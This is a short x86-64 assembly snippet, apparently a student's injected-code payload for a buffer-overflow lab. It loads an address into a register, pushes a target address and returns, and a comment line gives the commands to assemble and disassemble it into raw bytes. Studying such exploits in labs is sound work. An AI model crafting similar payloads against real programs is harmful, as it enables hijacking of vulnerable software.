#! gcc -c s.s -o o.o && objdump -d o.o > d.d && rm o.o
mov    $0x5561dca8,%rdi
pushq $0x00000000004018fa
ret
